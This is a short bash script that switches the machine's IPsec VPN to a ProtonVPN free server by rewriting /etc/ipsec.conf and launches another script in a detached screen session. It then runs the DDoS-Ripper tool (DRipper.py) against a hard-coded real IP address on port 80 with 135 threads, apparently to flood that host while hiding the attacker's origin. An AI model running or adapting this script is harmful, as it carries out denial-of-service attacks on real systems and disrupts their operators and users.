#!/bin/bash
DT=$(date +"%m-%d_%H-%M")
sudo ipsec down proton
sed -i 's/right=.*/right=us-free-14.protonvpn.com.udp.ovpn/g' /etc/ipsec.conf
sed -i 's/rightid=%.*/rightid=%us-free-14.protonvpn.com.udp.ovpn/g' /etc/ipsec.conf
sudo screen -d -m -S $DT ./22.sh
#dig TXT +short o-o.myaddr.l.google.com @ns1.google.com
sleep 3

cd DDoS-Ripper
sudo screen -d -m -S $DT python3 DRipper.py -s 3.127.79.123 -p 80 -t 135 -q 1
